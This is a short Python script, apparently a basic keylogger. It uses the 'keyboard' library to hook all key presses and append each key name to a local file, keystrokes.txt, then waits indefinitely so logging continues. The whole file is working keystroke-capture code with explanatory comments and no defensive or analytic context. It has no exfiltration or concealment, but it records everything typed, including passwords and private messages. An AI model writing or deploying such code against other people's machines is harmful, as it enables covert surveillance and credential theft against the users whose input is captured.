import keyboard

# Function to handle key press events and log them to a file
def keyPressed(event):
  # Open the log file in 'append' mode (creates it if it doesn't exist)
  with open("keystrokes.txt", 'a') as f:
    # Write the name of the pressed key to the file, followed by a newline
    f.write('{}\n'.format(event.name))

keyboard.on_press(keyPressed)

# we want our program to wait until a key is pressed before it exits.
keyboard.wait()
